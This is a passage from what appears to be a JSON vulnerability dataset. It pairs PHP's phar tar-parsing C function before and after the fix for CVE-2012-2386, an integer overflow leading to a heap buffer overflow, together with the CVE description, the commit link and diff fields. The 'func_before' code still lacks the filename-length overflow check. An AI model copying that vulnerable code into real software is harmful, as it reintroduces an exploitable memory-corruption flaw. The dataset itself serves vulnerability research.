char*)(buffer))[0]))\n#else\n# define PHAR_GET_32(buffer) (php_uint32) *(buffer)\n#endif\n\t\t\tmyphar->sig_flags = PHAR_GET_32(buf);\n\t\t\tif (FAILURE == phar_verify_signature(fp, php_stream_tell(fp) - size - 512, myphar->sig_flags, buf + 8, size - 8, fname, &myphar->signature, &myphar->sig_len, error TSRMLS_CC)) {\n\t\t\t\tif (error) {\n\t\t\t\t\tchar *save = *error;\n\t\t\t\t\tspprintf(error, 4096, \"phar error: tar-based phar \\\"%s\\\" signature cannot be verified: %s\", fname, save);\n\t\t\t\t\tefree(save);\n\t\t\t\t}\n\t\t\t\tgoto bail;\n\t\t\t}\n\t\t\tphp_stream_seek(fp, curloc + 512, SEEK_SET);\n\t\t\t/* signature checked out, let's ensure this is the last file in the phar */\n\t\t\tif (((hdr->typeflag == '\\0') || (hdr->typeflag == TAR_FILE)) && size > 0) {\n\t\t\t\t/* this is not good enough - seek succeeds even on truncated tars */\n\t\t\t\tphp_stream_seek(fp, 512, SEEK_CUR);\n\t\t\t\tif ((uint)php_stream_tell(fp) > totalsize) {\n\t\t\t\t\tif (error) {\n\t\t\t\t\t\tspprintf(error, 4096, \"phar error: \\\"%s\\\" is a corrupted tar file (truncated)\", fname);\n\t\t\t\t\t}\n\t\t\t\t\tphp_stream_close(fp);\n\t\t\t\t\tphar_destroy_phar_data(myphar TSRMLS_CC);\n\t\t\t\t\treturn FAILURE;\n\t\t\t\t}\n\t\t\t}\n\n\t\t\tread = php_stream_read(fp, buf, sizeof(buf));\n\n\t\t\tif (read != sizeof(buf)) {\n\t\t\t\tif (error) {\n\t\t\t\t\tspprintf(error, 4096, \"phar error: \\\"%s\\\" is a corrupted tar file (truncated)\", fname);\n\t\t\t\t}\n\t\t\t\tphp_stream_close(fp);\n\t\t\t\tphar_destroy_phar_data(myphar TSRMLS_CC);\n\t\t\t\treturn FAILURE;\n\t\t\t}\n\n\t\t\thdr = (tar_header*) buf;\n\t\t\tsum1 = phar_tar_number(hdr->checksum, sizeof(hdr->checksum));\n\n\t\t\tif (sum1 == 0 && phar_tar_checksum(buf, sizeof(buf)) == 0) {\n\t\t\t\tbreak;\n\t\t\t}\n\n\t\t\tif (error) {\n\t\t\t\tspprintf(error, 4096, \"phar error: \\\"%s\\\" has entries after signature, invalid phar\", fname);\n\t\t\t}\n\n\t\t\tgoto bail;\n\t\t}\n\n\t\tif (!last_was_longlink && hdr->typeflag == 'L') {\n\t\t\tlast_was_longlink = 1;\n\t\t\t/* support the ././@LongLink system for storing long filenames */\n\t\t\tentry.filename_len = entry.uncompressed_filesize;\n\n\t\t\t/* Check for overflow - bug 61065 */\n\t\t\tif (entry.filename_len == UINT_MAX) {\n\t\t\t\tif (error) {\n\t\t\t\t\tspprintf(error, 4096, \"phar error: \\\"%s\\\" is a corrupted tar file (invalid entry size)\", fname);\n\t\t\t\t}\n\t\t\t\tphp_stream_close(fp);\n\t\t\t\tphar_destroy_phar_data(myphar TSRMLS_CC);\n\t\t\t\treturn FAILURE;\n\t\t\t}\n\t\t\tentry.filename = pemalloc(entry.filename_len+1, myphar->is_persistent);\n\n\t\t\tread = php_stream_read(fp, entry.filename, entry.filename_len);\n\t\t\tif (read != entry.filename_len) {\n\t\t\t\tefree(entry.filename);\n\t\t\t\tif (error) {\n\t\t\t\t\tspprintf(error, 4096, \"phar error: \\\"%s\\\" is a corrupted tar file (truncated)\", fname);\n\t\t\t\t}\n\t\t\t\tphp_stream_close(fp);\n\t\t\t\tphar_destroy_phar_data(myphar TSRMLS_CC);\n\t\t\t\treturn FAILURE;\n\t\t\t}\n\t\t\tentry.filename[entry.filename_len] = '\\0';\n\n\t\t\t/* skip blank stuff */\n\t\t\tsize = ((size+511)&~511) - size;\n\n\t\t\t/* this is not good enough - seek succeeds even on truncated tars */\n\t\t\tphp_stream_seek(fp, size, SEEK_CUR);\n\t\t\tif ((uint)php_stream_tell(fp) > totalsize) {\n\t\t\t\tefree(entry.filename);\n\t\t\t\tif (error) {\n\t\t\t\t\tspprintf(error, 4096, \"phar error: \\\"%s\\\" is a corrupted tar file (truncated)\", fname);\n\t\t\t\t}\n\t\t\t\tphp_stream_close(fp);\n\t\t\t\tphar_destroy_phar_data(myphar TSRMLS_CC);\n\t\t\t\treturn FAILURE;\n\t\t\t}\n\n\t\t\tread = php_stream_read(fp, buf, sizeof(buf));\n\n\t\t\tif (read != sizeof(buf)) {\n\t\t\t\tefree(entry.filename);\n\t\t\t\tif (error) {\n\t\t\t\t\tspprintf(error, 4096, \"phar error: \\\"%s\\\" is a corrupted tar file (truncated)\", fname);\n\t\t\t\t}\n\t\t\t\tphp_stream_close(fp);\n\t\t\t\tphar_destroy_phar_data(myphar TSRMLS_CC);\n\t\t\t\treturn FAILURE;\n\t\t\t}\n\t\t\tcontinue;\n\t\t} else if (!last_was_longlink && !old && hdr->prefix[0] != 0) {\n\t\t\tchar name[256];\n\t\t\tint i, j;\n\n\t\t\tfor (i = 0; i < 155; i++) {\n\t\t\t\tname[i] = hdr->prefix[i];\n\t\t\t\tif (name[i] == '\\0') {\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t}\n\t\t\tname[i++] = '/';\n\t\t\tfor (j = 0; j < 100; j++) {\n\t\t\t\tname[i+j] = hdr->name[j];\n\t\t\t\tif (name[i+j] == '\\0') {\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t}\n\n\t\t\tentry.filename_len = i+j;\n\n\t\t\tif (name[entry.filename_len - 1] == '/') {\n\t\t\t\t/* some tar programs store directories with trailing slash */\n\t\t\t\tentry.filename_len--;\n\t\t\t}\n\t\t\tentry.filename = pestrndup(name, entry.filename_len, myphar->is_persistent);\n\t\t} else if (!last_was_longlink) {\n\t\t\tint i;\n\n\t\t\t/* calculate strlen, which can be no longer than 100 */\n\t\t\tfor (i = 0; i < 100; i++) {\n\t\t\t\tif (hdr->name[i] == '\\0') {\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t}\n\t\t\tentry.filename_len = i;\n\t\t\tentry.filename = pestrndup(hdr->name, i, myphar->is_persistent);\n\n\t\t\tif (entry.filename[entry.filename_len - 1] == '/') {\n\t\t\t\t/* some tar programs store directories with trailing slash */\n\t\t\t\tentry.filename[entry.filename_len - 1] = '\\0';\n\t\t\t\tentry.filename_len--;\n\t\t\t}\n\t\t}\n\t\tlast_was_longlink = 0;\n\n\t\tphar_add_virtual_dirs(myphar, entry.filename, entry.filename_len TSRMLS_CC);\n\n\t\tif (sum1 != sum2) {\n\t\t\tif (error) {\n\t\t\t\tspprintf(error, 4096, \"phar error: \\\"%s\\\" is a corrupted tar file (checksum mismatch of file \\\"%s\\\")\", fname, entry.filename);\n\t\t\t}\n\t\t\tpefree(entry.filename, myphar->is_persistent);\n\t\t\tphp_stream_close(fp);\n\t\t\tphar_destroy_phar_data(myphar TSRMLS_CC);\n\t\t\treturn FAILURE;\n\t\t}\n\n\t\tentry.tar_type = ((old & (hdr->typeflag == '\\0')) ? TAR_FILE : hdr->typeflag);\n\t\tentry.offset = entry.offset_abs = pos; /* header_offset unused in tar */\n\t\tentry.fp_type = PHAR_FP;\n\t\tentry.flags = phar_tar_number(hdr->mode, sizeof(hdr->mode)) & PHAR_ENT_PERM_MASK;\n\t\tentry.timestamp = phar_tar_number(hdr->mtime, sizeof(hdr->mtime));\n\t\tentry.is_persistent = myphar->is_persistent;\n#ifndef S_ISDIR\n#define S_ISDIR(mode)\t(((mode)&S_IFMT) == S_IFDIR)\n#endif\n\t\tif (old && entry.tar_type == TAR_FILE && S_ISDIR(entry.flags)) {\n\t\t\tentry.tar_type = TAR_DIR;\n\t\t}\n\n\t\tif (entry.tar_type == TAR_DIR) {\n\t\t\tentry.is_dir = 1;\n\t\t} else {\n\t\t\tentry.is_dir = 0;\n\t\t}\n\n\t\tentry.link = NULL;\n\n\t\tif (entry.tar_type == TAR_LINK) {\n\t\t\tif (!zend_hash_exists(&myphar->manifest, hdr->linkname, strlen(hdr->linkname))) {\n\t\t\t\tif (error) {\n\t\t\t\t\tspprintf(error, 4096, \"phar error: \\\"%s\\\" is a corrupted tar file - hard link to non-existent file \\\"%s\\\"\", fname, hdr->linkname);\n\t\t\t\t}\n\t\t\t\tpefree(entry.filename, entry.is_persistent);\n\t\t\t\tphp_stream_close(fp);\n\t\t\t\tphar_destroy_phar_data(myphar TSRMLS_CC);\n\t\t\t\treturn FAILURE;\n\t\t\t}\n\t\t\tentry.link = estrdup(hdr->linkname);\n\t\t} else if (entry.tar_type == TAR_SYMLINK) {\n\t\t\tentry.link = estrdup(hdr->linkname);\n\t\t}\n\t\tphar_set_inode(&entry TSRMLS_CC);\n\t\tzend_hash_add(&myphar->manifest, entry.filename, entry.filename_len, (void*)&entry, sizeof(phar_entry_info), (void **) &newentry);\n\n\t\tif (entry.is_persistent) {\n\t\t\t++entry.manifest_pos;\n\t\t}\n\n\t\tif (entry.filename_len >= sizeof(\".phar/.metadata\")-1 && !memcmp(entry.filename, \".phar/.metadata\", sizeof(\".phar/.metadata\")-1)) {\n\t\t\tif (FAILURE == phar_tar_process_metadata(newentry, fp TSRMLS_CC)) {\n\t\t\t\tif (error) {\n\t\t\t\t\tspprintf(error, 4096, \"phar error: tar-based phar \\\"%s\\\" has invalid metadata in magic file \\\"%s\\\"\", fname, entry.filename);\n\t\t\t\t}\n\t\t\t\tphp_stream_close(fp);\n\t\t\t\tphar_destroy_phar_data(myphar TSRMLS_CC);\n\t\t\t\treturn FAILURE;\n\t\t\t}\n\t\t}\n\n\t\tif (!actual_alias && entry.filename_len == sizeof(\".phar/alias.txt\")-1 && !strncmp(entry.filename, \".phar/alias.txt\", sizeof(\".phar/alias.txt\")-1)) {\n\t\t\t/* found explicit alias */\n\t\t\tif (size > 511) {\n\t\t\t\tif (error) {\n\t\t\t\t\tspprintf(error, 4096, \"phar error: tar-based phar \\\"%s\\\" has alias that is larger than 511 bytes, cannot process\", fname);\n\t\t\t\t}\n\t\t\t\tphp_stream_close(fp);\n\t\t\t\tphar_destroy_phar_data(myphar TSRMLS_CC);\n\t\t\t\treturn FAILURE;\n\t\t\t}\n\n\t\t\tread = php_stream_read(fp, buf, size);\n\n\t\t\tif (read == size) {\n\t\t\t\tbuf[size] = '\\0';\n\t\t\t\tif (!phar_validate_alias(buf, size)) {\n\t\t\t\t\tif (size > 50) {\n\t\t\t\t\t\tbuf[50] = '.';\n\t\t\t\t\t\tbuf[51] = '.';\n\t\t\t\t\t\tbuf[52] = '.';\n\t\t\t\t\t\tbuf[53] = '\\0';\n\t\t\t\t\t}\n\n\t\t\t\t\tif (error) {\n\t\t\t\t\t\tspprintf(error, 4096, \"phar error: invalid alias \\\"%s\\\" in tar-based phar \\\"%s\\\"\", buf, fname);\n\t\t\t\t\t}\n\n\t\t\t\t\tphp_stream_close(fp);\n\t\t\t\t\tphar_destroy_phar_data(myphar TSRMLS_CC);\n\t\t\t\t\treturn FAILURE;\n\t\t\t\t}\n\n\t\t\t\tactual_alias = pestrndup(buf, size, myphar->is_persistent);\n\t\t\t\tmyphar->alias = actual_alias;\n\t\t\t\tmyphar->alias_len = size;\n\t\t\t\tphp_stream_seek(fp, pos, SEEK_SET);\n\t\t\t} else {\n\t\t\t\tif (error) {\n\t\t\t\t\tspprintf(error, 4096, \"phar error: Unable to read alias from tar-based phar \\\"%s\\\"\", fname);\n\t\t\t\t}\n\n\t\t\t\tphp_stream_close(fp);\n\t\t\t\tphar_destroy_phar_data(myphar TSRMLS_CC);\n\t\t\t\treturn FAILURE;\n\t\t\t}\n\t\t}\n\n\t\tsize = (size+511)&~511;\n\n\t\tif (((hdr->typeflag == '\\0') || (hdr->typeflag == TAR_FILE)) && size > 0) {\n\t\t\t/* this is not good enough - seek succeeds even on truncated tars */\n\t\t\tphp_stream_seek(fp, size, SEEK_CUR);\n\t\t\tif ((uint)php_stream_tell(fp) > totalsize) {\n\t\t\t\tif (error) {\n\t\t\t\t\tspprintf(error, 4096, \"phar error: \\\"%s\\\" is a corrupted tar file (truncated)\", fname);\n\t\t\t\t}\n\t\t\t\tphp_stream_close(fp);\n\t\t\t\tphar_destroy_phar_data(myphar TSRMLS_CC);\n\t\t\t\treturn FAILURE;\n\t\t\t}\n\t\t}\n\n\t\tread = php_stream_read(fp, buf, sizeof(buf));\n\n\t\tif (read != sizeof(buf)) {\n\t\t\tif (error) {\n\t\t\t\tspprintf(error, 4096, \"phar error: \\\"%s\\\" is a corrupted tar file (truncated)\", fname);\n\t\t\t}\n\t\t\tphp_stream_close(fp);\n\t\t\tphar_destroy_phar_data(myphar TSRMLS_CC);\n\t\t\treturn FAILURE;\n\t\t}\n\t} while (read != 0);\n\n\tif (zend_hash_exists(&(myphar->manifest), \".phar/stub.php\", sizeof(\".phar/stub.php\")-1)) {\n\t\tmyphar->is_data = 0;\n\t} else {\n\t\tmyphar->is_data = 1;\n\t}\n\n\t/* ensure signature set */\n\tif (!myphar->is_data && PHAR_G(require_hash) && !myphar->signature) {\n\t\tphp_stream_close(fp);\n\t\tphar_destroy_phar_data(myphar TSRMLS_CC);\n\t\tif (error) {\n\t\t\tspprintf(error, 0, \"tar-based phar \\\"%s\\\" does not have a signature\", fname);\n\t\t}\n\t\treturn FAILURE;\n\t}\n\n\tmyphar->fname = pestrndup(fname, fname_len, myphar->is_persistent);\n#ifdef PHP_WIN32\n\tphar_unixify_path_separators(myphar->fname, fname_len);\n#endif\n\tmyphar->fname_len = fname_len;\n\tmyphar->fp = fp;\n\tp = strrchr(myphar->fname, '/');\n\n\tif (p) {\n\t\tmyphar->ext = memchr(p, '.', (myphar->fname + fname_len) - p);\n\t\tif (myphar->ext == p) {\n\t\t\tmyphar->ext = memchr(p + 1, '.', (myphar->fname + fname_len) - p - 1);\n\t\t}\n\t\tif (myphar->ext) {\n\t\t\tmyphar->ext_len = (myphar->fname + fname_len) - myphar->ext;\n\t\t}\n\t}\n\n\tphar_request_initialize(TSRMLS_C);\n\n\tif (SUCCESS != zend_hash_add(&(PHAR_GLOBALS->phar_fname_map), myphar->fname, fname_len, (void*)&myphar, sizeof(phar_archive_data*), (void **)&actual)) {\n\t\tif (error) {\n\t\t\tspprintf(error, 4096, \"phar error: Unable to add tar-based phar \\\"%s\\\" to phar registry\", fname);\n\t\t}\n\t\tphp_stream_close(fp);\n\t\tphar_destroy_phar_data(myphar TSRMLS_CC);\n\t\treturn FAILURE;\n\t}\n\n\tmyphar = *actual;\n\n\tif (actual_alias) {\n\t\tphar_archive_data **fd_ptr;\n\n\t\tmyphar->is_temporary_alias = 0;\n\n\t\tif (SUCCESS == zend_hash_find(&(PHAR_GLOBALS->phar_alias_map), actual_alias, myphar->alias_len, (void **)&fd_ptr)) {\n\t\t\tif (SUCCESS != phar_free_alias(*fd_ptr, actual_alias, myphar->alias_len TSRMLS_CC)) {\n\t\t\t\tif (error) {\n\t\t\t\t\tspprintf(error, 4096, \"phar error: Unable to add tar-based phar \\\"%s\\\", alias is already in use\", fname);\n\t\t\t\t}\n\t\t\t\tzend_hash_del(&(PHAR_GLOBALS->phar_fname_map), myphar->fname, fname_len);\n\t\t\t\treturn FAILURE;\n\t\t\t}\n\t\t}\n\n\t\tzend_hash_add(&(PHAR_GLOBALS->phar_alias_map), actual_alias, myphar->alias_len, (void*)&myphar, sizeof(phar_archive_data*), NULL);\n\t} else {\n\t\tphar_archive_data **fd_ptr;\n\n\t\tif (alias_len) {\n\t\t\tif (SUCCESS == zend_hash_find(&(PHAR_GLOBALS->phar_alias_map), alias, alias_len, (void **)&fd_ptr)) {\n\t\t\t\tif (SUCCESS != phar_free_alias(*fd_ptr, alias, alias_len TSRMLS_CC)) {\n\t\t\t\t\tif (error) {\n\t\t\t\t\t\tspprintf(error, 4096, \"phar error: Unable to add tar-based phar \\\"%s\\\", alias is already in use\", fname);\n\t\t\t\t\t}\n\t\t\t\t\tzend_hash_del(&(PHAR_GLOBALS->phar_fname_map), myphar->fname, fname_len);\n\t\t\t\t\treturn FAILURE;\n\t\t\t\t}\n\t\t\t}\n\t\t\tzend_hash_add(&(PHAR_GLOBALS->phar_alias_map), alias, alias_len, (void*)&myphar, sizeof(phar_archive_data*), NULL);\n\t\t\tmyphar->alias = pestrndup(alias, alias_len, myphar->is_persistent);\n\t\t\tmyphar->alias_len = alias_len;\n\t\t} else {\n\t\t\tmyphar->alias = pestrndup(myphar->fname, fname_len, myphar->is_persistent);\n\t\t\tmyphar->alias_len = fname_len;\n\t\t}\n\n\t\tmyphar->is_temporary_alias = 1;\n\t}\n\n\tif (pphar) {\n\t\t*pphar = myphar;\n\t}\n\n\treturn SUCCESS;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -183,7 +183,7 @@\n \t\t\t}\n \n \t\t\tread = php_stream_read(fp, buf, sizeof(buf));\n-\t\n+\n \t\t\tif (read != sizeof(buf)) {\n \t\t\t\tefree(entry.filename);\n \t\t\t\tif (error) {",
        "diff_line_info": {
            "deleted_lines": [
                "\t"
            ],
            "added_lines": [
                ""
            ]
        }
    },
    {
        "cve_id": "CVE-2012-2386",
        "func_name": "php/php-src/phar_parse_tarfile",
        "description": "Integer overflow in the phar_parse_tarfile function in tar.c in the phar extension in PHP before 5.3.14 and 5.4.x before 5.4.4 allows remote attackers to cause a denial of service (application crash) or possibly execute arbitrary code via a crafted tar file that triggers a heap-based buffer overflow.",
        "git_url": "https://github.com/php/php-src/commit/4eb802bb14b05b82573457bc0f528e61ca7ddc45",
        "commit_title": "fix bug #61065",
        "commit_text": "(cherry picked from commit a10e778bfb7ce9caa1f91666ddf2705db7982d68)",
        "func_before": "int phar_parse_tarfile(php_stream* fp, char *fname, int fname_len, char *alias, int alias_len, phar_archive_data** pphar, int is_data, php_uint32 compression, char **error TSRMLS_DC) /* {{{ */\n{\n\tchar buf[512], *actual_alias = NULL, *p;\n\tphar_entry_info entry = {0};\n\tsize_t pos = 0, read, totalsize;\n\ttar_header *hdr;\n\tphp_uint32 sum1, sum2, size, old;\n\tphar_archive_data *myphar, **actual;\n\tint last_was_longlink = 0;\n\n\tif (error) {\n\t\t*error = NULL;\n\t}\n\n\tphp_stream_seek(fp, 0, SEEK_END);\n\ttotalsize = php_stream_tell(fp);\n\tphp_stream_seek(fp, 0, SEEK_SET);\n\tread = php_stream_read(fp, buf, sizeof(buf));\n\n\tif (read != sizeof(buf)) {\n\t\tif (error) {\n\t\t\tspprintf(error, 4096, \"phar error: \\\"%s\\\" is not a tar file or is truncated\", fname);\n\t\t}\n\t\tphp_stream_close(fp);\n\t\treturn FAILURE;\n\t}\n\n\thdr = (tar_header*)buf;\n\told = (memcmp(hdr->magic, \"ustar\", sizeof(\"ustar\")-1) != 0);\n\n\tmyphar = (phar_archive_data *) pecalloc(1, sizeof(phar_archive_data), PHAR_G(persist));\n\tmyphar->is_persistent = PHAR_G(persist);\n\t/* estimate number of entries, can't be certain with tar files */\n\tzend_hash_init(&myphar->manifest, 2 + (totalsize >> 12),\n\t\tzend_get_hash_value, destroy_phar_manifest_entry, (zend_bool)myphar->is_persistent);\n\tzend_hash_init(&myphar->mounted_dirs, 5,\n\t\tzend_get_hash_value, NULL, (zend_bool)myphar->is_persistent);\n\tzend_hash_init(&myphar->virtual_dirs, 4 + (totalsize >> 11),\n\t\tzend_get_hash_value, NULL, (zend_bool)myphar->is_persistent);\n\tmyphar->is_tar = 1;\n\t/* remember whether this entire phar was compressed with gz/bzip2 */\n\tmyphar->flags = compression;\n\n\tentry.is_tar = 1;\n\tentry.is_crc_checked = 1;\n\tentry.phar = myphar;\n\tpos += sizeof(buf);\n\n\tdo {\n\t\tphar_entry_info *newentry;\n\n\t\tpos = php_stream_tell(fp);\n\t\thdr = (tar_header*) buf;\n\t\tsum1 = phar_tar_number(hdr->checksum, sizeof(hdr->checksum));\n\t\tif (sum1 == 0 && phar_tar_checksum(buf, sizeof(buf)) == 0) {\n\t\t\tbreak;\n\t\t}\n\t\tmemset(hdr->checksum, ' ', sizeof(hdr->checksum));\n\t\tsum2 = phar_tar_checksum(buf, old?sizeof(old_tar_header):sizeof(tar_header));\n\n\t\tsize = entry.uncompressed_filesize = entry.compressed_filesize =\n\t\t\tphar_tar_number(hdr->size, sizeof(hdr->size));\n\n\t\tif (((!old && hdr->prefix[0] == 0) || old) && strlen(hdr->name) == sizeof(\".phar/signature.bin\")-1 && !strncmp(hdr->name, \".phar/signature.bin\", sizeof(\".phar/signature.bin\")-1)) {\n\t\t\toff_t curloc;\n\n\t\t\tif (size > 511) {\n\t\t\t\tif (error) {\n\t\t\t\t\tspprintf(error, 4096, \"phar error: tar-based phar \\\"%s\\\" has signature that is larger than 511 bytes, cannot process\", fname);\n\t\t\t\t}\nbail:\n\t\t\t\tphp_stream_close(fp);\n\t\t\t\tphar_destroy_phar_data(myphar TSRMLS_CC);\n\t\t\t\treturn FAILURE;\n\t\t\t}\n\t\t\tcurloc = php_stream_tell(fp);\n\t\t\tread = php_stream_read(fp, buf, size);\n\t\t\tif (read != size) {\n\t\t\t\tif (error) {\n\t\t\t\t\tspprintf(error, 4096, \"phar error: tar-based phar \\\"%s\\\" signature cannot be read\", fname);\n\t\t\t\t}\n\t\t\t\tgoto bail;\n\t\t\t}\n#ifdef WORDS_BIGENDIAN\n# define PHAR_GET_32(buffer) \\\n\t(((((unsigned char*)(buffer))[3]) << 24) \\\n\t\t| ((((unsigned char*)(buffer))[2]) << 16) \\\n\t\t| ((((unsigned char*)(buffer))[1]) <<  8) \\\n\t\t| (((unsigned char*)(buffer))[0]))\n#else\n# define PHAR_GET_32(buffer) (php_uint32) *(buffer)\n#endif\n\t\t\tmyphar->sig_flags = PHAR_GET_32(buf);\n\t\t\tif (FAILURE == phar_verify_signature(fp, php_stream_tell(fp) - size - 512, myphar->sig_flags, buf + 8, size - 8, fname, &myphar->signature, &myphar->sig_len, error TSRMLS_CC)) {\n\t\t\t\tif (error) {\n\t\t\t\t\tchar *save = *error;\n\t\t\t\t\tspprintf(error, 4096, \"phar error: tar-based phar \\\"%s\\\" signature cannot be verified: %s\", fname, save);\n\t\t\t\t\tefree(save);\n\t\t\t\t}\n\t\t\t\tgoto bail;\n\t\t\t}\n\t\t\tphp_stream_seek(fp, curloc + 512, SEEK_SET);\n\t\t\t/* signature checked out, let's ensure this is the last file in the phar */\n\t\t\tif (((hdr->typeflag == '\\0') || (hdr->typeflag == TAR_FILE)) && size > 0) {\n\t\t\t\t/* this is not good enough - seek succeeds even on truncated tars */\n\t\t\t\tphp_stream_seek(fp, 512, SEEK_CUR);\n\t\t\t\tif ((uint)php_stream_tell(fp) > totalsize) {\n\t\t\t\t\tif (error) {\n\t\t\t\t\t\tspprintf(error, 4096, \"phar error: \\\"%s\\\" is a corrupted tar file (truncated)\", fname);\n\t\t\t\t\t}\n\t\t\t\t\tphp_stream_close(fp);\n\t\t\t\t\tphar_destroy_phar_data(myphar TSRMLS_CC);\n\t\t\t\t\treturn FAILURE;\n\t\t\t\t}\n\t\t\t}\n\n\t\t\tread = php_stream_read(fp, buf, sizeof(buf));\n\n\t\t\tif (read != sizeof(buf)) {\n\t\t\t\tif (error) {\n\t\t\t\t\tspprintf(error, 4096, \"phar error: \\\"%s\\\" is a corrupted tar file (truncated)\", fname);\n\t\t\t\t}\n\t\t\t\tphp_stream_close(fp);\n\t\t\t\tphar_destroy_phar_data(myphar TSRMLS_CC);\n\t\t\t\treturn FAILURE;\n\t\t\t}\n\n\t\t\thdr = (tar_header*) buf;\n\t\t\tsum1 = phar_tar_number(hdr->checksum, sizeof(hdr->checksum));\n\n\t\t\tif (sum1 == 0 && phar_tar_checksum(buf, sizeof(buf)) == 0) {\n\t\t\t\tbreak;\n\t\t\t}\n\n\t\t\tif (error) {\n\t\t\t\tspprintf(error, 4096, \"phar error: \\\"%s\\\" has entries after signature, invalid phar\", fname);\n\t\t\t}\n\n\t\t\tgoto bail;\n\t\t}\n\n\t\tif (!last_was_longlink && hdr->typeflag == 'L') {\n\t\t\tlast_was_longlink = 1;\n\t\t\t/* support the ././@LongLink system for storing long filenames */\n\t\t\tentry.filename_len = entry.uncompressed_filesize;\n\t\t\tentry.filename = pemalloc(entry.filename_len+1, myphar->is_persistent);\n\n\t\t\tread = php_stream_read(fp, entry.filename, entry.filename_len);\n\t\t\tif (read != entry.filename_len) {\n\t\t\t\tefree(entry.filename);\n\t\t\t\tif (error) {\n\t\t\t\t\tspprintf(error, 4096, \"phar error: \\\"%s\\\" is a corrupted tar file (truncated)\", fname);\n\t\t\t\t}\n\t\t\t\tphp_stream_close(fp);\n\t\t\t\tphar_destroy_phar_data(myphar TSRMLS_CC);\n\t\t\t\treturn FAILURE;\n\t\t\t}\n\t\t\tentry.filename[entry.filename_len] = '\\0';\n\n\t\t\t/* skip blank stuff */\n\t\t\tsize = ((size+511)&~511) - size;\n\n\t\t\t/* this is not good enough - seek succeeds even on truncated tars */\n\t\t\tphp_stream_seek(fp, size, SEEK_CUR);\n\t\t\tif ((uint)php_stream_tell(fp) > totalsize) {\n\t\t\t\tefree(entry.filename);\n\t\t\t\tif (error) {\n\t\t\t\t\tspprintf(error, 4096, \"phar error: \\\"%s\\\" is a corrupted tar file (truncated)\", fname);\n\t\t\t\t}\n\t\t\t\tphp_stream_close(fp);\n\t\t\t\tphar_destroy_phar_data(myphar TSRMLS_CC);\n\t\t\t\treturn FAILURE;\n\t\t\t}\n\n\t\t\tread = php_stream_read(fp, buf, sizeof(buf));\n\t\n\t\t\tif (read != sizeof(buf)) {\n\t\t\t\tefree(entry.filename);\n\t\t\t\tif (error) {\n\t\t\t\t\tspprintf(error, 4096, \"phar error: \\\"%s\\\" is a corrupted tar file (truncated)\", fname);\n\t\t\t\t}\n\t\t\t\tphp_stream_close(fp);\n\t\t\t\tphar_destroy_phar_data(myphar TSRMLS_CC);\n\t\t\t\treturn FAILURE;\n\t\t\t}\n\t\t\tcontinue;\n\t\t} else if (!last_was_longlink && !old && hdr->prefix[0] != 0) {\n\t\t\tchar name[256];\n\t\t\tint i, j;\n\n\t\t\tfor (i = 0; i < 155; i++) {\n\t\t\t\tname[i] = hdr->prefix[i];\n\t\t\t\tif (name[i] == '\\0') {\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t}\n\t\t\tname[i++] = '/';\n\t\t\tfor (j = 0; j < 100; j++) {\n\t\t\t\tname[i+j] = hdr->name[j];\n\t\t\t\tif (name[i+j] == '\\0') {\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t}\n\n\t\t\tentry.filename_len = i+j;\n\n\t\t\tif (name[entry.filename_len - 1] == '/') {\n\t\t\t\t/* some tar programs store directories with trailing slash */\n\t\t\t\tentry.filename_len--;\n\t\t\t}\n\t\t\tentry.filename = pestrndup(name, entry.filename_len, myphar->is_persistent);\n\t\t} else if (!last_was_longlink) {\n\t\t\tint i;\n\n\t\t\t/* calculate strlen, which can be no longer than 100 */\n\t\t\tfor (i = 0; i < 100; i++) {\n\t\t\t\tif (hdr->name[i] == '\\0') {\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t}\n\t\t\tentry.filename_len = i;\n\t\t\tentry.filename = pestrndup(hdr->name, i, myphar->is_persistent);\n\n\t\t\tif (entry.filename[entry.filename_len - 1] == '/') {\n\t\t\t\t/* some tar programs store directories with trailing slash */\n\t\t\t\tentry.filename[entry.filename_len - 1] = '\\0';\n\t\t\t\tentry.filename_len--;\n\t\t\t}\n\t\t}\n\t\tlast_was_longlink = 0;\n\n\t\tphar_add_virtual_dirs(myphar, entry.filename, entry.filename_len TSRMLS_CC);\n\n\t\tif (sum1 != sum2) {\n\t\t\tif (error) {\n\t\t\t\tspprintf(error, 4096, \"phar error: \\\"%s\\\" is a corrupted tar file (checksum mismatch of file \\\"%s\\\")\", fname, entry.filename);\n\t\t\t}\n\t\t\tpefree(entry.filename, myphar->is_persistent);\n\t\t\tphp_stream_close(fp);\n\t\t\tphar_destroy_phar_data(myphar TSRMLS_CC);\n\t\t\treturn FAILURE;\n\t\t}\n\n\t\tentry.tar_type = ((old & (hdr->typeflag == '\\0')) ? TAR_FILE : hdr->typeflag);\n\t\tentry.offset = entry.offset_abs = pos; /* header_offset unused in tar */\n\t\tentry.fp_type = PHAR_FP;\n\t\tentry.flags = phar_tar_number(hdr->mode, sizeof(hdr->mode)) & PHAR_ENT_PERM_MASK;\n\t\tentry.timestamp = phar_tar_number(hdr->mtime, sizeof(hdr->mtime));\n\t\tentry.is_persistent = myphar->is_persistent;\n#ifndef S_ISDIR\n#define S_ISDIR(mode)\t(((mode)&S_IFMT) == S_IFDIR)\n#endif\n\t\tif (old && entry.tar_type == TAR_FILE && S_ISDIR(entry.flags)) {\n\t\t\tentry.tar_type = TAR_DIR;\n\t\t}\n\n\t\tif (entry.tar_type == TAR_DIR) {\n\t\t\tentry.is_dir = 1;\n\t\t} else {\n\t\t\tentry.is_dir = 0;\n\t\t}\n\n\t\tentry.link = NULL;\n\n\t\tif (entry.tar_type == TAR_LINK) {\n\t\t\tif (!zend_hash_exists(&myphar->manifest, hdr->linkname, strlen(hdr->linkname))) {\n\t\t\t\tif (error) {\n\t\t\t\t\tspprintf(error, 4096, \"phar error: \\\"%s\\\" is a corrupted tar file - hard link to non-existent file \\\"%s\\\"\", fname, hdr->linkname);\n\t\t\t\t}\n\t\t\t\tpefree(entry.filename, entry.is_persistent);\n\t\t\t\tphp_stream_close(fp);\n\t\t\t\tphar_destroy_phar_data(myphar TSRMLS_CC);\n\t\t\t\treturn FAILURE;\n\t\t\t}\n\t\t\tentry.link = estrdup(hdr->linkname);\n\t\t} else if (entry.tar_type == TAR_SYMLINK) {\n\t\t\tentry.link = 